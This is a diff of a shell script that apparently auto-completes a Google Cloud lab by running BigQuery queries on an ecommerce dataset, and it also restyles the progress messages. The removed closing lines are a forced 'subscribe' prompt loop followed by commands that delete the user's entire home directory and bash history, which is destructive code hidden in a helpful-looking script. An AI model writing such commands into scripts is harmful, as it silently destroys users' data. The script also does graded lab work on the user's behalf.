@@ -35,25 +35,9 @@ echo "${RANDOM_BG_COLOR}${RANDOM_TEXT_COLOR}${BOLD}#                            
 echo "${RANDOM_BG_COLOR}${RANDOM_TEXT_COLOR}${BOLD}######################################################################${RESET}"
 #----------------------------------------------------start--------------------------------------------------#
 
-echo "${YELLOW}${BOLD}
+echo "${BG_MAGENTA}${BOLD}Now Starting Execution!!${RESET}"
 
-Starting Execution!!
-
-
-${RESET}"
-#gcloud auth list
-#gcloud config list project
 export PROJECT_ID=$(gcloud info --format='value(config.project)')
-#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
-#export EMAIL=$(gcloud config get-value core/account)
-#gcloud config set compute/region us-central1
-#gcloud config set compute/zone us-central1-a
-#export ZONE=us-central1-a
-
-
-
-#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
-#----------------------------------------------------code--------------------------------------------------#
 
 bq query --use_legacy_sql=false \
 "
@@ -65,12 +49,7 @@ fullVisitorId, channelGrouping, time, country, city, totalTransactionRevenue, tr
 HAVING num_duplicate_rows > 1;
 "
 
-echo "${GREEN}${BOLD}
-
-Task 2 Completed🥳
-
-${RESET}"
-
+echo "${YELLOW}${BOLD}Task 2. ${RESET}""${GREEN}${BOLD}Explore ecommerce data and identify duplicate records Completed${RESET}"
 
 bq query --use_legacy_sql=false \
 "
@@ -96,8 +75,6 @@ GROUP BY 1,2,3 ,4, 5, 6, 7, 8, 9, 10,11,12
 HAVING row_count > 1 # find duplicates
 "
 
-
-
 bq query --use_legacy_sql=false \
 "
 #standardSQL
@@ -106,7 +83,6 @@ SELECT
   COUNT(DISTINCT fullVisitorId) AS unique_visitors
 FROM \`data-to-insights.ecommerce.all_sessions\`;
 "
-
 
 bq query --use_legacy_sql=false \
 "
@@ -119,8 +95,6 @@ GROUP BY channelGrouping
 ORDER BY channelGrouping DESC;
 "
 
-
-
 bq query --use_legacy_sql=false \
 "
 #standardSQL
@@ -130,7 +104,6 @@ FROM \`data-to-insights.ecommerce.all_sessions\`
 GROUP BY ProductName
 ORDER BY ProductName
 "
-
 
 bq query --use_legacy_sql=false \
 "
@@ -144,8 +117,6 @@ GROUP BY v2ProductName
 ORDER BY product_views DESC
 LIMIT 5;
 "
-
-
 
 bq query --use_legacy_sql=false \
 "
@@ -167,7 +138,6 @@ ORDER BY unique_view_count DESC
 LIMIT 5
 "
 
-
 bq query --use_legacy_sql=false \
 "
 #standardSQL
@@ -182,7 +152,6 @@ GROUP BY v2ProductName
 ORDER BY product_views DESC
 LIMIT 5;
 "
-
 
 bq query --use_legacy_sql=false \
 "
@@ -200,27 +169,8 @@ ORDER BY product_views DESC
 LIMIT 5;
 "
 
+echo "${YELLOW}${BOLD}Task 3. ${RESET}""${GREEN}${BOLD}Write basic SQL on ecommerce data Completed${RESET}"
 
-echo "${GREEN}${BOLD}
-
-Task 3 Completed🥳
-
-Lab Completed !!!💪
-
-${RESET}"
+echo "${BG_RED}${BOLD}Congratulations For Completing The Lab!!🥳${RESET}"
 
 #-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED}Subscribe to Edutechbarsha [y/n] : ${RESET}" CONSENT_REMOVE
-
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Edutechbarsha [y/n] : ${RESET}" CONSENT_REMOVE
-done
-
-echo "${BLUE}${BOLD}Thanks For Subscribing🤩 :)${RESET}"
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
-
